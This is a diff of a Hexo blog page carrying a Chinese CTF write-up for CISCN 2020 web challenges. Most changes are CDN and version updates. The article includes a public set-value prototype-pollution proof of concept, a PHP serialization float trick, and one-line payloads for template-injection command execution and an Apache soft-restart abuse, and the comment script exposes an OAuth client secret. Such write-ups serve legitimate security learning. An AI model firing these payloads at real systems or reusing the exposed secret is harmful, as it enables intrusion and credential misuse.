@@ -6,19 +6,19 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="littlegame js原型链污染，set-value库3.0.0旧版本。公开exploit如下： 12345678910const setFn &#x3D; require(&amp;#x27;set-value&amp;#x27;);const paths &#x3D; [&amp;#x27;constructor.prototype.a0&amp;#x27;, &amp;#x27;__proto__.a1&amp;#x27;,];(function ()">
+    <meta name="description" content="littlegame js原型链污染，set-value库3.0.0旧版本。公开exploit如下： 12345678910const setFn &#x3D; require(&#x27;set-value&#x27;);const paths &#x3D; [&#x27;constructor.prototype.a0&#x27;, &#x27;__proto__.a1&#x27;,];(function ()">
 <meta property="og:type" content="article">
 <meta property="og:title" content="第十三届全国大学生信息安全竞赛西北赛区 Web题目 Writeup">
 <meta property="og:url" content="https://blog.frankli.site/2020/08/21/Security/Writeup/CISCN%202020/index.html">
 <meta property="og:site_name" content="Frank">
-<meta property="og:description" content="littlegame js原型链污染，set-value库3.0.0旧版本。公开exploit如下： 12345678910const setFn &#x3D; require(&amp;#x27;set-value&amp;#x27;);const paths &#x3D; [&amp;#x27;constructor.prototype.a0&amp;#x27;, &amp;#x27;__proto__.a1&amp;#x27;,];(function ()">
+<meta property="og:description" content="littlegame js原型链污染，set-value库3.0.0旧版本。公开exploit如下： 12345678910const setFn &#x3D; require(&#x27;set-value&#x27;);const paths &#x3D; [&#x27;constructor.prototype.a0&#x27;, &#x27;__proto__.a1&#x27;,];(function ()">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2020-08-20T16:00:00.000Z">
 <meta property="article:modified_time" content="2021-04-11T21:37:38.000Z">
 <meta property="article:author" content="Frank Li">
+<meta property="article:tag" content="CISCN">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="Writeup">
-<meta property="article:tag" content="CISCN">
 <meta name="twitter:card" content="summary">
     
     
@@ -79,7 +79,7 @@
         .card { width: calc(20% - 20px); }
     }
     .card-container { width: 90%; }
-</style><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="Frank" type="application/atom+xml">
+</style><!-- hexo injector head_end end --><meta name="generator" content="Hexo 8.0.0"><link rel="alternate" href="/atom.xml" title="Frank" type="application/atom+xml">
 </head>
 
 <body class="max-width mx-auto px3 ltr">
@@ -183,7 +183,7 @@
   <div class="content" itemprop="articleBody">
     <h2 id="littlegame">littlegame</h2>
 <p>js原型链污染，<code>set-value</code>库3.0.0旧版本。公开exploit如下：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> setFn = <span class="built_in">require</span>(<span class="string">&#x27;set-value&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> paths = [<span class="string">&#x27;constructor.prototype.a0&#x27;</span>, <span class="string">&#x27;__proto__.a1&#x27;</span>,];</span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> p <span class="keyword">of</span> paths) &#123; setFn(&#123;&#125;, p, <span class="literal">true</span>); &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; paths.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((&#123;&#125;)[<span class="string">`a<span class="subst">$&#123;i&#125;</span>`</span>] === <span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">`Yes with <span class="subst">$&#123;paths[i]&#125;</span>`</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> setFn = <span class="built_in">require</span>(<span class="string">&#x27;set-value&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> paths = [<span class="string">&#x27;constructor.prototype.a0&#x27;</span>, <span class="string">&#x27;__proto__.a1&#x27;</span>,];</span><br><span class="line">(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> p <span class="keyword">of</span> paths) &#123; <span class="title function_">setFn</span>(&#123;&#125;, p, <span class="literal">true</span>); &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; paths.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((&#123;&#125;)[<span class="string">`a<span class="subst">$&#123;i&#125;</span>`</span>] === <span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Yes with <span class="subst">$&#123;paths[i]&#125;</span>`</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>
 <p>拿来主义，用就完了</p>
 <p>阅读源码，可以发现在<code>/Privilege</code>处进行了<code>set-value</code>调用，并且在<code>/DeveloperControlPanel</code>处检查了<code>Admin</code>对象（一个普通的数组）的任意可控属性，那污染字典类型的原型，添加一个自定义属性即可。</p>
 <p>最终exploit：</p>
@@ -195,24 +195,21 @@
 <code>SimpleXMLElement</code>也找不到合适的方式利用(有可能么？)</p>
 <p>后来想了想，不可能是利用对象的<code>__toString</code>来绕过，因为这样无法同时绕过三个判断</p>
 <p>最后发现<code>1.00...001</code>在转字符串的时候会变成<code>1</code></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span>:</span></span><br><span class="line">    trick1 = <span class="number">1.00000000000001</span></span><br><span class="line">    trick2 = <span class="number">1.000000000000001</span></span><br><span class="line"><span class="built_in">print</span>(serialize(trick()))</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">trick</span>:</span><br><span class="line">    trick1 = <span class="number">1.00000000000001</span></span><br><span class="line">    trick2 = <span class="number">1.000000000000001</span></span><br><span class="line"><span class="built_in">print</span>(serialize(trick()))</span><br></pre></td></tr></table></figure>
 <h2 id="剩下两道就放个payload吧。。">剩下两道就放个payload吧。。</h2>
 <ul>
-<li>rceme: 没过滤反引号 <code>?a=&#123;if:var_dump(``ls``)&#125;&#123;end if&#125;</code></li>
+<li>rceme: 没过滤反引号 <code>?a={if:var_dump(``ls``)}{end if}</code></li>
 <li>easyphp: Apache收到SIGUSR1的时候会软重启 <code>?a=call_user_func&amp;b=pcntl_wait</code></li>
 </ul>
-
-<div id="gitalk-container"></div>
-<script src="https://cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script><link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css"><script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
-
-		<script>
-		var gitalkConfig = {"clientID":"5955d155fe2ea768241e","clientSecret":"f96bbda9ff434950217f24f7f9369f8b8de3b025","repo":"frankli0324.github.io","owner":"frankli0324","admin":["frankli0324"],"distractionFreeMode":false};
-	    gitalkConfig.id = md5(location.pathname);
-		var gitalk = new Gitalk(gitalkConfig);
-	    gitalk.render("gitalk-container");
-	    </script><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>
+<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>
   </div>
 </article>
+
+    <div class="blog-post-comments">
+        <div id="gitalk-container">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
+    </div>
 
 
 
@@ -272,7 +269,7 @@
     Copyright &copy;
     
     
-    2017-2024
+    2017-2025
     Frank Li
   </div>
   <div class="footer-right">
@@ -297,12 +294,12 @@
 
 
 
-  <link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.3/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+  <link rel="preload" as="style" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/7.0.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
 
 
     <!-- jquery -->
  
-  <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" crossorigin="anonymous"></script> 
+  <script src="https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js" crossorigin="anonymous"></script> 
 
 
 
@@ -310,7 +307,7 @@
 <!-- clipboard -->
 
   
-    <script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" crossorigin="anonymous"></script> 
+    <script src="https://cdn.bootcdn.net/ajax/libs/clipboard.js/2.0.11/clipboard.min.js" crossorigin="anonymous"></script> 
   
   <script type="text/javascript">
   $(function() {
@@ -353,8 +350,37 @@
 
 <!-- Umami Analytics -->
 
-<!-- Disqus Comments -->
 
+<script src="https://cdn.bootcdn.net/blueimp-md5/2.12.0/js/md5.min.js"></script>
+<link href="https://cdn.bootcdn.net/ajax/libs/gitalk/1.8.0/gitalk.min.css" rel="stylesheet">
+<style>
+  .gt-comment-content:hover {
+    box-shadow: none !important;
+  }
+  .gt-comment-content {
+    border-radius: 5px;
+  }
+</style>
+<script type="text/javascript">
+    (function(){
+        var gitalk = document.createElement('script');
+        gitalk.type = 'text/javascript';
+        gitalk.async = true;
+        gitalk.src = 'https://cdn.bootcdn.net/ajax/libs/gitalk/1.8.0/gitalk.min.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(gitalk);
+        gitalk.onload = function(){
+            var gitalk = new Gitalk({
+                id: md5(location.pathname),
+                clientID: '5955d155fe2ea768241e',
+                clientSecret: 'f96bbda9ff434950217f24f7f9369f8b8de3b025',
+                repo: 'frankli0324.github.io',
+                owner: 'frankli0324',
+                admin: ['frankli0324'],
+            });
+            gitalk.render('gitalk-container');
+        };
+    }());
+</script>
 
 </body>
 </html>
